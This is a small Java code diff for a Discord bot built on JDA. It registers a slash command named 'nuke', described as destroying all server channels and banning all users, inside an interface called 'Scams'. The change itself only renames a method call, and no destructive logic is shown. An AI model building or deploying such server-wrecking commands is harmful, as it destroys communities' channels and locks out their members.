@@ -6,7 +6,7 @@ import net.dv8tion.jda.api.interactions.commands.build.CommandData;
 public interface Scams {
 
     static void Scams(){
-        Android24.addCommand(new CommandData("nuke", "Completely destroy all the server channels and ban all users")
+        Android24.addCommands(new CommandData("nuke", "Completely destroy all the server channels and ban all users")
         .setDefaultEnabled(true));
     }
 }
